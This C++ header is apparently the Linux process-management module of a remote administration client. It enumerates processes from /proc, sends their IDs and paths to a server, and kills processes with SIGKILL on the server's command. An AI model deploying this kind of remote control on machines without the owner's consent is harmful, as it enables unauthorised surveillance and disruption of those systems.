#pragma once
#include <dirent.h>
#include <signal.h>
#include <cstring>
#include <string>
#include <vector>
#include <fstream>
#include <unistd.h>

// ============== Linux 进程管理（参考 Windows 端 client/SystemManager.cpp）==============
// 通过 /proc 文件系统枚举进程，发送 TOKEN_PSLIST 格式数据
// 通过 kill() 终止进程

class SystemManager : public IOCPManager
{
public:
    SystemManager(IOCPClient* client)
        : m_client(client)
    {
        // 与 Windows 端一致：构造时立即发送进程列表
        SendProcessList();
    }

    ~SystemManager() {}

    virtual VOID OnReceive(PBYTE szBuffer, ULONG ulLength)
    {
        if (!szBuffer || ulLength == 0) return;

        switch (szBuffer[0]) {
        case COMMAND_PSLIST:
            SendProcessList();
            break;
        case COMMAND_KILLPROCESS:
            KillProcess(szBuffer + 1, ulLength - 1);
            SendProcessList(); // 杀完后自动刷新
            break;
        case COMMAND_WSLIST:
            SendWindowsList();
            break;
        default:
            Mprintf("[SystemManager] Unknown sub-command: %d\n", (int)szBuffer[0]);
            break;
        }
    }

private:

    // ---- 读取 /proc/[pid]/comm ----
    static std::string readProcFile(pid_t pid, const char* entry)
    {
        char path[128];
        snprintf(path, sizeof(path), "/proc/%d/%s", (int)pid, entry);
        std::ifstream f(path);
        if (!f.is_open()) return "";
        std::string line;
        std::getline(f, line);
        // comm 末尾可能有换行符
        while (!line.empty() && (line.back() == '\n' || line.back() == '\r'))
            line.pop_back();
        return line;
    }

    // ---- readlink /proc/[pid]/exe ----
    static std::string readExeLink(pid_t pid)
    {
        char path[128], buf[1024];
        snprintf(path, sizeof(path), "/proc/%d/exe", (int)pid);
        ssize_t len = readlink(path, buf, sizeof(buf) - 1);
        if (len <= 0) return "";
        buf[len] = '\0';
        // 内核可能追加 " (deleted)"
        std::string s(buf);
        const char* suffix = " (deleted)";
        if (s.size() > strlen(suffix) &&
            s.compare(s.size() - strlen(suffix), strlen(suffix), suffix) == 0) {
            s.erase(s.size() - strlen(suffix));
        }
        return s;
    }

    // ---- 判断字符串是否全数字（PID 目录名）----
    static bool isNumeric(const char* s)
    {
        if (!s || !*s) return false;
        for (; *s; ++s)
            if (*s < '0' || *s > '9') return false;
        return true;
    }

    // ---- 枚举所有进程，构造 TOKEN_PSLIST 二进制数据 ----
    void SendProcessList()
    {
        if (!m_client) return;

        // 预分配缓冲区
        std::vector<uint8_t> buf;
        buf.reserve(64 * 1024);

        // [0] TOKEN_PSLIST
        buf.push_back((uint8_t)TOKEN_PSLIST);

        const char* arch = (sizeof(void*) == 8) ? "x64" : "x86";

        DIR* dir = opendir("/proc");
        if (!dir) {
            // 仅发送空列表头
            m_client->Send2Server((char*)buf.data(), (ULONG)buf.size());
            return;
        }

        struct dirent* ent;
        while ((ent = readdir(dir)) != nullptr) {
            if (!isNumeric(ent->d_name))
                continue;

            pid_t pid = (pid_t)atoi(ent->d_name);
            if (pid <= 0) continue;

            // 进程名
            std::string comm = readProcFile(pid, "comm");
            if (comm.empty()) continue; // 进程可能已退出

            // 完整路径
            std::string exePath = readExeLink(pid);
            if (exePath.empty())
                exePath = "[" + comm + "]"; // 内核线程无 exe 链接

            // 拼接 "进程名:架构"
            std::string exeFile = comm + ":" + arch;

            // -- 写入二进制数据 --
            // PID (DWORD, 4 字节)
            DWORD dwPid = (DWORD)pid;
            const uint8_t* p = (const uint8_t*)&dwPid;
            buf.insert(buf.end(), p, p + sizeof(DWORD));

            // exeFile (null 结尾)
            buf.insert(buf.end(), exeFile.begin(), exeFile.end());
            buf.push_back(0);

            // fullPath (null 结尾)
            buf.insert(buf.end(), exePath.begin(), exePath.end());
            buf.push_back(0);
        }
        closedir(dir);

        m_client->Send2Server((char*)buf.data(), (ULONG)buf.size());
        Mprintf("[SystemManager] SendProcessList: %u bytes\n", (unsigned)buf.size());
    }

    // ---- 终止进程：接收多个 PID（每个 4 字节 DWORD）----
    void KillProcess(LPBYTE szBuffer, UINT ulLength)
    {
        for (UINT i = 0; i + sizeof(DWORD) <= ulLength; i += sizeof(DWORD)) {
            DWORD dwPid = *(DWORD*)(szBuffer + i);
            pid_t pid = (pid_t)dwPid;
            if (pid <= 1) continue; // 不允许 kill init
            int ret = kill(pid, SIGKILL);
            Mprintf("[SystemManager] kill(%d, SIGKILL) = %d\n", (int)pid, ret);
        }
        usleep(100000); // 100ms 等待进程退出
    }

    // ---- 空窗口列表（Linux 无 GUI 窗口管理）----
    void SendWindowsList()
    {
        if (!m_client) return;
        uint8_t buf[1] = { (uint8_t)TOKEN_WSLIST };
        m_client->Send2Server((char*)buf, 1);
        Mprintf("[SystemManager] SendWindowsList (empty)\n");
    }

    IOCPClient* m_client;
};
